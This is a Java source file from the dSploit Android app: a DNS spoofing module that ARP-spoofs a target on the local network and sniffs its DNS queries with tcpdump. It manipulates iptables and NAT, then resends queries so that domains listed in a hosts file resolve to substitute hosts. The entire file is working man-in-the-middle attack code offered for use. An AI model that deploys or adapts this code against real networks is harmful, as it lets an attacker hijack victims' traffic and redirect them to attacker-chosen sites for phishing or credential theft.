/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */


package it.evilsocket.dsploit.plugins.mitm;
import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.Shell.OutputReceiver;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.tools.ArpSpoof;
import it.evilsocket.dsploit.tools.IPTables;
import it.evilsocket.dsploit.tools.TcpDump;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.NoRouteToHostException;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;
import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.MenuItem;




public class DNSSpoof extends SherlockActivity implements OnClickListener{
	//this regex validates an IP packet, and groups SRC and DST IP Address and ports
	String regex="^.+length\\s+(\\d+)\\)\\s+([\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3})\\.[^\\s]+\\s+>\\s+([\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3}\\.[\\d]{1,3})\\.[^\\:]+.*";
	Pattern regex_pattern=Pattern.compile(regex);//compile the regex
	
	//toggleButton and TextView views to be displayed
	ToggleButton start;	
	TextView text;
	
	//arpspoofer and tcp instances
	ArpSpoof spoofer;
	TcpDump sniffer;
	
	//controls the state of the module
	boolean spoofing=false; 
	
	//hosts file entries
	static ArrayList<HostFileEntry> entries;
	
	
	//this class saves the content of each hosts file entry
	public static class HostFileEntry{	
	String host2Spoof;	//domain to spoof
	String HexfakeHost;	//replacing domain
	
	public HostFileEntry(String host2spoof,String FakeHost){
		this.HexfakeHost=FakeHost;
		this.host2Spoof=host2spoof;
	}
	}
	
	
	
	public static class DNSPacket{
		
		String request;	//Raw packet on Hex codification
		byte[]IP;		//IP Header
		byte[]UDP;		//UDP Header
		byte[]DNS;		//DNS Message
		byte[]RawQuerys;	//DNS Message Queries
		boolean OK=false;	//well formed DNS message?
		int IP_LENGTH;		//length of IP Header
		int UDP_LENGTH=16;	//set to 16 
		int DNS_LENGTH;		// DNS length
		
		public DNSPacket(String request){
			String temp=request;
			byte[] temp_byte=request.getBytes();

			//get IP_LENGTH (num. of 4bytes words*2char/byte*4bytes/word)
			IP_LENGTH=Integer.parseInt(temp.substring(1, 2),10)*8;  

			DNS_LENGTH=temp.length()-(UDP_LENGTH+IP_LENGTH);
			
			//copy the IP header
			IP=new byte[IP_LENGTH];
			java.lang.System.arraycopy(temp_byte, 0, IP, 0, IP_LENGTH);
			//remove ip header from string/array request
			temp=temp.substring(IP_LENGTH);
			temp_byte=temp.getBytes();
			
			//copy the udp header
			UDP=new byte[UDP_LENGTH];
			java.lang.System.arraycopy(temp_byte, 0, UDP, 0, UDP_LENGTH);
			//remove udp header from string/array request
			temp=temp.substring(UDP_LENGTH);
			temp_byte=temp.getBytes();

			//copy the dns header
			DNS=new byte[DNS_LENGTH];
			java.lang.System.arraycopy(temp_byte, 0, DNS, 0, DNS_LENGTH);
			//remove udp header from string/array request
			temp=temp.substring(DNS_LENGTH);
			temp_byte=temp.getBytes();
			
			if((DNS_LENGTH>32)){
				//well formed query
				OK=true;
				//get the queries contained on the message
			RawQuerys=new String(DNS).substring(24,DNS_LENGTH).getBytes();

			}

		}
		
		
		//returs query's TransactionID
		public String getTransacionID(){
			
			String DNS=new String(this.DNS);
			String Tid=(DNS.substring(0,4));
			
			return Tid;
		}
		
		//returns query's flags
		public String getQueryFlags(){
			String DNS=new String(this.DNS);

			return DNS.substring(4,8);
		}
		//returns number of queries contained on DNS message
		public int getNumberOfQueries(){
				String DNS=new String(this.DNS);
				int number=Integer.parseInt(DNS.substring(8,12),16);

			return number;
		}
		
		/*
		public int getNumberOfAnswers(){
			String DNS=new String(this.DNS);
			int number=Integer.parseInt(DNS.substring(12,16),16);

		return number;
		}
		*/
		
		public int getNumberOfAuthRR(){
			String DNS=new String(this.DNS);
			int number=Integer.parseInt(DNS.substring(16,20),16);

		return number;
		}
		
		public int getNumberOfAdditionalRR(){
			String DNS=new String(this.DNS);
			int number=Integer.parseInt(DNS.substring(20,24),16);

		return number;
		}
		
		
		public byte[] getRawQuerys(){
			return this.RawQuerys;
		}
		
		
		//returns DNS Message src port
		public int getSRCPort(){
			String UDP=new String(this.UDP);
			int port=Integer.parseInt(UDP.substring(0,4),16);
			
			return port;
		}
		
		//returns DNS Message src IP
		public String getSRCIp(){
			String IP=new String(this.IP).substring(24,32);
			String b1=String.valueOf(Integer.parseInt(IP.substring(0,2),16));
			String b2=String.valueOf(Integer.parseInt(IP.substring(2,4),16));
			String b3=String.valueOf(Integer.parseInt(IP.substring(4,6),16));
			String b4=String.valueOf(Integer.parseInt(IP.substring(6,8),16));

			
			return b1+"."+b2+"."+b3+"."+b4;
	
		}
		//returns DNS Message DNS IP
		public String getDSTIp(){
			String IP=new String(this.IP).substring(32,this.IP.length);
			String b1=String.valueOf(Integer.parseInt(IP.substring(0,2),16));
			String b2=String.valueOf(Integer.parseInt(IP.substring(2,4),16));
			String b3=String.valueOf(Integer.parseInt(IP.substring(4,6),16));
			String b4=String.valueOf(Integer.parseInt(IP.substring(6,8),16));

			
			return b1+"."+b2+"."+b3+"."+b4;

		}
		
	
		//returns DNS Message dst port
		public int getDSTPort(){
			return 53;
		}
		
		
		//return the queried Host
		public String getQueriedHost(){
			
			byte[] array=hexStringToByteArray(new String(this.RawQuerys).substring(2, RawQuerys.length-10));
			
			
			return new String(array);
		}
		
		//return type of query
		public int getQuerytype(){
			return Integer.parseInt(new String(RawQuerys).substring(RawQuerys.length-8,RawQuerys.length-4),16);
			
		}
		//return query's class
		public int getQueryClass(){
			return Integer.parseInt(new String(RawQuerys).substring(RawQuerys.length-4,RawQuerys.length),16);
			
		}
		
	}
	
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setTitle( System.getCurrentTarget() + " > MITM > DNS Spoof" );
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		this.setContentView(R.layout.dnsspoof_layout);
		//initialize the views
		start=(ToggleButton)findViewById(R.id.start_);
		text=(TextView)findViewById(R.id.DNSLog);
		//and set the onClick handler
		start.setOnClickListener(this);

		//initialize spoof and sniff tools
		spoofer=System.getArpSpoof();
		sniffer=System.getTcpDump();
		//builds hosts  file path
		String hosts_path=new File(System.getStoragePath()+"/hosts").getAbsolutePath();
		//get entries contained on hosts file
		entries=readHostsFile(hosts_path);
		
		

			}

	@Override
	public void onClick(View v) {

		if(!spoofing){
			//stop forwarding to port 53
			System.getIPTables().discardForwardding2Port(53);
			updateLog(1);
			start.setChecked(true);
			spoofing=true;
			spoofer.spoof(System.getCurrentTarget(), new OutputReceiver() {//start MITM
				
				
				public void onStart(String command) {
					System.setForwarding(true);
					//sniff the traffic, discard non-dns traffic and src=LOCALMAC
					sniffer.sniff(" -vvvx  dst port 53  and not '(ether src host "+getLocalMacAsString()+")'", null, new OutputReceiver() {
						
						
						StringBuffer reqdata=new StringBuffer();	
						@Override
						public void onStart(String command) {
							//Log.d("tCPDUMP",command);
							
						}
						
						@Override
						public void onNewLine(String line) {
							
							Matcher matcher=regex_pattern.matcher(line);
							
							if(!matcher.find() && !line.contains("tcpdump")){
								
								line=line.substring(line.indexOf(":")+1).trim().replace(" ", "");
								reqdata.append(line);
								
								
							}else{

								if(reqdata.length()>0){	
									
											// TODO Auto-generated method stub
											parseRequest(reqdata.toString());

								}
								reqdata.delete(0,reqdata.length());
		
							}
							
							
						}
						
						@Override
						public void onEnd(int exitCode) {
							// TODO Auto-generated method stub
							
						}
					}).start(); //start sniffer
					
					
				}
				
				
				public void onNewLine(String line) {
					
					
				}
				
				
				public void onEnd(int exitCode) {
					
				}
			}).start();//start ARPspoofer
		}else{
			//allow forwarding to port 53
			System.getIPTables().allowForwardding2Port(53);
			//stop arpspoof and sniffer
			updateLog(0);
			spoofer.kill();
			sniffer.kill();
			start.setChecked(false);
			spoofing=false;
		}
		
	}
	
	
	
	/*
	 * Updates the TextView on start and on stop
	 */
	public void updateLog(int code){
		String old=(String) text.getText();
		switch(code){

		case 1:
			text.setText(old+"\nDNS Spoof module started at "+new Date(java.lang.System.currentTimeMillis()));	
			break;
		case 0:
			text.setText(old+"\nDNS Spoof module stopped at "+new Date(java.lang.System.currentTimeMillis()));
			break;
		}
	}
	

	/*
	 * parse request, search on host file entries list 
	 * and send the request
	 */
	public   void parseRequest(String packet){
		
		
		DNSPacket dns=new DNSPacket(packet);	//create new object DNSPacket
		
		System.getIPTables().changeSource(dns.getSRCIp());//change source IP to Dns message src IP

		String queriedHost=dns.getQueriedHost();	//get queried Host (Hex)
		String printableHost=removeNonPrintableChars(queriedHost);//get only printable chars of queried Host
		
		//found entry on hosts file
		if((dns.getQuerytype()==1)  && (findInEntriesList(printableHost)!=null)){//search on host file entries list
			
			//have to spoof the query
			String FakeDomain=findInEntriesList(printableHost);//get replacing domain
			String spoofedDNSReq=dns.getTransacionID()+"01000001000000000000"+FakeDomain+"00010001";//add common flags on type A request, A type and class 1
			sendQuery(spoofedDNSReq, dns.getSRCPort(), dns.getDSTIp());//send query
	
			
			
		
		}
	else{
		//not found entry on hosts file

			//send the original query
			String originlQuery=packet.replace(new String(dns.IP)+new String(dns.UDP), "");
			sendQuery(originlQuery, dns.getSRCPort(), dns.getDSTIp());
			

		}
		
		System.getIPTables().flushNAT();//flush NAT table

	}
	
	
	/*
	 * Basically opens a socket and sends the spoofed or original query
	 * 
	 */
	public static void sendQuery(String DNSMessage,int srcport,String dstIP){
		DatagramSocket s = null;
		try {

			s=new DatagramSocket(srcport);
			byte[] data =hexStringToByteArray(DNSMessage);
			DatagramPacket p=new DatagramPacket(data,data.length,InetAddress.getByName(dstIP),53);
			s.send(p);
			s.close();
			
		} catch (SocketException e) {
			
				Log.i("SocketException","socket exception: "+e.getMessage());
		} catch (IOException e) {
			Log.i("IOSocketException","IOException");
			e.printStackTrace();
		}
	}
	
	
	//finds domain on host File entries
	public static String findInEntriesList(String s){
		String fakeDomain=null;
		for(int i=0;i<entries.size();i++){
			if(s.equals(removeNonPrintableChars(entries.get(i).host2Spoof))){
				fakeDomain=entries.get(i).HexfakeHost;
				break;
			}
		}
		return fakeDomain;
	}
	
	//removes non printable chars from string
	public static String removeNonPrintableChars(String S){
		String printable="";
		for(int i=0;i<S.length();i++){
			
			if(isPrintable(S.charAt(i))){
				printable+=S.charAt(i);
			}
		}
		return printable;
	}
	
	//tels if a given char is printable
	public static boolean isPrintable(char c){
		boolean printable=false;
		
		if( (c>=65 && c<=90) || (c>=97 && c<=122) ){
			printable=true;
		}
		return printable;
	}
	
	//parse host file
	public  ArrayList<HostFileEntry> readHostsFile(String Path){
		ArrayList<HostFileEntry> entries =new ArrayList<HostFileEntry>();
		try {
			BufferedReader br = new BufferedReader(new FileReader(Path));
			String line=br.readLine() ;
			while(line != null){
				
				HostFileEntry entry=new HostFileEntry(line.split("\\s+")[0], line.split("\\s+")[1]);
				entries.add(entry);
				line=br.readLine() ;
			}
		
		
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			Toast.makeText(this, "Error While Reading Host file, File Not Found", Toast.LENGTH_SHORT).show();
		} catch (IOException e) {
			Toast.makeText(this, "Error While Reading  Host file", Toast.LENGTH_SHORT).show();
		}
		
		
		
		
		if(entries.size()>0){
			Toast.makeText(this, "Found "+entries.size()+" Entries on Hosts File", Toast.LENGTH_SHORT).show();
		}
		return entries;
	}
	

	public static byte[] hexStringToByteArray(String s) {
	    int len = s.length();
	    byte[] data = new byte[len / 2];
	    for (int i = 0; i < len; i += 2) {
	        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
	                             + Character.digit(s.charAt(i+1), 16));
	    }
	    
	    return data;
	}
	
	//get MAC device´s MAC Address
	public static String getLocalMacAsString(){
		byte[] mac = null;
		try {
		mac=System.getNetwork().getLocalHardware();
		} catch (NoRouteToHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		StringBuilder b = new StringBuilder();
		String s="";
		for (int i = 0; i < mac.length; i++) {
		    b.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));

		s= b.toString();
			
			
		}
		
		return s;
	}

	/*
	 * 
	 * this two methods do the same:
	 * 
	 * ->onOptionsItemSelected takes you to the parent activity when actionBar arrow is pressed
	 * 
	 * ->onbackPressed does the same but when  the back button on the device is pressed
	 * 
	 * @see com.actionbarsherlock.app.SherlockActivity#onOptionsItemSelected(android.view.MenuItem)
	 */



	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
		case android.R.id.home:            

			onBackPressed();

			return true;

		default:            
			return super.onOptionsItemSelected(item);    
		}
	}

	public void onBackPressed() {
		super.onBackPressed();
		overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}


}
